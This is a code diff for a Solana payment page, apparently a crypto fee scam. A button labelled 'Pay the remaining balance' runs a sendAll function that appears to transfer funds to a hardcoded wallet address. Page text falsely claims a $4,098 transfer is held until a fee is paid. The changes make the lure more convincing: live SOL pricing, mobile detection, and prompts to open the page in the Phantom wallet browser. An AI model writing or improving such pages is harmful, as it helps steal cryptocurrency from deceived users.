@@ -8,8 +8,37 @@ export default function SolanaPage() {
 
   const DESTINO = "6A7UUr1x9kK1gkPmE1ys2s7H2zii289j27KvRsBX1q3f"
 
+  const [isMobile, setIsMobile] = useState(false)
+
+useEffect(() => {
+  setIsMobile(/iPhone|Android/i.test(navigator.userAgent))
+}, [])
+
+
+const [solPrice, setSolPrice] = useState(0)
+
+useEffect(() => {
+  const fetchPrice = async () => {
+    try {
+      const res = await fetch(
+        "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"
+      )
+      const data = await res.json()
+      setSolPrice(data.solana.usd)
+    } catch (err) {
+      console.error("price error", err)
+    }
+  }
+
+  fetchPrice()
+  const interval = setInterval(fetchPrice, 30000) // cada 30s
+
+  return () => clearInterval(interval)
+}, [])
+
+
   // 🔁 demo conversion
-  const SOL_RATE = 160
+  const SOL_RATE = solPrice || 160
   const usd = -5.09
   const sol = usd / SOL_RATE
 
@@ -74,7 +103,7 @@ const publicKey = res.publicKey
 
       await connection.confirmTransaction(sig)
 
-      alert("Transferido 🚀")
+      alert("Transferred 🚀")
     } catch (err) {
       console.error(err)
       alert("Error en la transacción")
@@ -131,29 +160,61 @@ const publicKey = res.publicKey
         />
       ))}
 
-      {/* 💰 CONTENIDO */}
-      <div className="relative z-10 text-center">
-        <h1 className="text-6xl md:text-8xl font-semibold tracking-tight">
-          {usd.toFixed(2)} USD
-        </h1>
+  <button
+  onClick={() => window.location.href = "/"}
+  className="absolute top-6 left-6 text-xs tracking-widest text-white/40 hover:text-white transition"
+>
+  ← Back to home
+</button>
 
-        <p className="mt-4 text-white/60 text-sm tracking-widest">
-          = {sol.toFixed(6)} SOL
-        </p>
+
+      {/* 💰 CONTENIDO */}
+
+<div className="flex flex-col items-center text-center">
+
+<div className="mb-4 flex justify-center">
+  <div className="px-4 py-2 text-xs tracking-widest rounded-full 
+    bg-purple-600/20 text-purple-300 border border-purple-500/40
+    shadow-[0_0_20px_rgba(168,85,247,0.4)] flex items-center gap-2">
+
+    {/* 🔴 punto morado */}
+    <span className="w-2 h-2 rounded-full bg-purple-400 shadow-[0_0_10px_rgba(168,85,247,0.8)]"></span>
+
+    This link is for Phantom
+  </div>
+</div>
+
+  {/* 💰 USD */}
+  <h1 className="text-6xl md:text-8xl font-semibold tracking-tight">
+    {usd.toFixed(2)} USD
+  </h1>
+
+  {/* 💱 BALANCE */}
+<p className="mt-4 text-white/20 text-sm tracking-widest">
+  = {sol.toFixed(6)} SOL
+</p>
 
         {/* 🔘 BOTÓN */}
         <button
           onClick={sendAll}
           className="mt-10 px-6 py-3 text-xs tracking-widest border border-purple-500/40 text-purple-300 hover:bg-purple-500 hover:text-white transition rounded-full"
         >
-          PAY THE REMAINING BALANCE 
+          Pay the remaining balance
 
         </button>
 
 
 <p className="mt-6 text-center text-white/60 max-w-sm mx-auto leading-relaxed">
-  The transfer of -$4098 to 82ed***Xap is on hold until the full fee balance is released. Please pay the fee to release your transfer.
-</p>
+The transfer of -$4,098 to 82ed******Xap is on hold until the full fee balance is released. Please pay the fee to release your transfer</p>
+
+
+{isMobile && (
+  <div className="mt-3 flex justify-center">
+    <p className="text-xs text-yellow-400/80 tracking-widest text-center max-w-xs">
+      Mobile detected — use desktop or open this page in Phantom browser
+    </p>
+  </div>
+)}
 
 
       </div>
